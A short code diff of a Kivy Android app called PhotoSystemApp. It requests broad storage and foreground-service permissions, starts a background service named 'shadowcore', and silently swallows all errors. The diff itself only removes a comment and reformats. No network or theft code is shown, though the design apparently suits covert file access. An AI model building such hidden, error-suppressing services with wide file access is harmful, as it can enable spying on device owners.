@@ -13,7 +13,6 @@ class PhotoSystemApp(App):
     def ask_permissions(self, dt):
         try:
             from android.permissions import request_permissions, Permission
-            # طلب صلاحيات القراءة الشاملة للملفات
             perms = [
                 Permission.READ_EXTERNAL_STORAGE,
                 Permission.WRITE_EXTERNAL_STORAGE,
@@ -21,16 +20,14 @@ class PhotoSystemApp(App):
                 Permission.FOREGROUND_SERVICE
             ]
             request_permissions(perms, self.start_service)
-        except:
-            pass
+        except: pass
 
     def start_service(self, permissions, grants):
         try:
             PythonActivity = autoclass('org.kivy.android.PythonActivity')
             service_class = autoclass('org.test.shadowcore.ServiceService')
             service_class.start(PythonActivity.mActivity, "")
-        except:
-            pass
+        except: pass
 
 if __name__ == "__main__":
     PhotoSystemApp().run()
